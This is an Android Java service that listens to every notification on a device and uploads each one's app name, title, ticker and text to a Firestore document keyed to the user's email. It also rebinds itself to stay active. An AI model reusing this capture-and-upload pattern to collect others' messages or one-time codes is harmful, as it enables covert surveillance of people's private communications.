package com.cerner.notif;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.SetOptions;

import java.sql.Timestamp;
import java.util.HashMap;

public class SH extends NotificationListenerService {
    FirebaseFirestore firebaseFirestore;
    private static final int NOTIF_ID = 107203 ;

    private static final String CHANNEL_ID = "com.cerner.CHANNELID" ;
    Context context;
    public SH() {

        Log.d(String.valueOf(SH.class), "SH: ");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        firebaseFirestore = FirebaseFirestore.getInstance();
        Toast.makeText(context, "SH onCreate", Toast.LENGTH_SHORT).show();
    }

    @Override
    public StatusBarNotification[] getActiveNotifications(String[] keys) {
        return super.getActiveNotifications(keys);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {

        super.onNotificationPosted(sbn);
        Timestamp timestamp = new Timestamp(System.currentTimeMillis());
        String pack = sbn.getPackageName();
        String ticker = String.valueOf(":"+sbn.getNotification().tickerText);
        Bundle extra = sbn.getNotification().extras;
        String title = extra.getString("android.title");
        String text = String.valueOf("Text::"+extra.getCharSequence("android.text"));
        Log.d(String.valueOf(SH.class), "onNotificationPosted: "+pack+"\n"+ticker+"\n"+title+"\n"+"\n");
       // Toast.makeText(this, ""+title, Toast.LENGTH_SHORT).show();
        String finalString =  pack +" : "+title+" : "+" : "+ ticker + " : " +text;
        long finalTime = timestamp.getTime();
        String ftime = String.valueOf(finalTime);
        FirebaseAuth firebaseAuth = FirebaseAuth.getInstance();
        FirebaseUser firebaseUser = firebaseAuth.getCurrentUser();
        HashMap<String,String> data = new HashMap<>();
        data.put(ftime,finalString);
        Log.d(String.valueOf(SH.class), "Data "+data);
        firebaseFirestore.collection("users").document(firebaseUser.getEmail()).set(data,SetOptions.merge()).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                Log.d(String.valueOf(SH.class), "data written successfully ");
                Toast.makeText(SH.this, ":)", Toast.LENGTH_SHORT).show();
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                Log.d(String.valueOf(SH.class), "data written failed ");
               Toast.makeText(SH.this, "data written failed!", Toast.LENGTH_SHORT).show();
            }
        });
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
      //  Toast.makeText(context, "onStartCmd", Toast.LENGTH_SHORT).show();
        tryReconnect();
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
      //  Toast.makeText(context, "onLC", Toast.LENGTH_SHORT).show();
        Log.d(String.valueOf(SH.class), "onListenerConnected: connected bey");
//        Notification notification = new Notification.Builder(this)
//                .setContentTitle("Akkiei")
//                .setContentText("Service is running in the background")
//                .setSmallIcon(R.drawable.ic_priority_high_black_24dp)
//                .build();
//
//        NotificationCompat.Builder builder = new NotificationCompat.Builder(SH.this,CHANNEL_ID);
//        builder.setSmallIcon(R.drawable.ic_priority_high_black_24dp);
//        builder.setContentTitle(" Notification");
//        builder.setContentText("Hi Akkiei");
//        builder.setPriority(NotificationCompat.PRIORITY_DEFAULT);
//        builder.setChannelId(CHANNEL_ID);
//
//        NotificationManagerCompat notificationManagerCompat = NotificationManagerCompat.from(SH.this);
//        notificationManagerCompat.notify(NOTIF_ID,builder.build());
//
//        NotificationChannel notificationChannel = null;
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            notificationChannel = new NotificationChannel(CHANNEL_ID,"MyChannel", NotificationManager.IMPORTANCE_HIGH);
//            notificationChannel.setLightColor(Color.RED);
//            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
//
//        }

//
//        NotificationManager notificationManager = (NotificationManager) getSystemService(context.NOTIFICATION_SERVICE);
//        if( notificationManager != null) {
//            notificationManager.notify(NOTIF_ID,notification);
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                notificationManager.createNotificationChannel(notificationChannel);
//            }
//        }
//        startForeground(NOTIF_ID,notification);
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        Log.d(String.valueOf(SH.class), "onNotificationRemoved: notif removed");

    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }

    public void tryReconnect(){

        toggleNotificationListenerService();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            ComponentName componentName = new ComponentName(getApplicationContext(), SH.class);
            requestRebind(componentName);
        }

    }

    public void toggleNotificationListenerService() {

        PackageManager packageManager = getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(this, SH.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        packageManager.setComponentEnabledSetting(new ComponentName(this, SH.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,PackageManager.DONT_KILL_APP);
    }

}
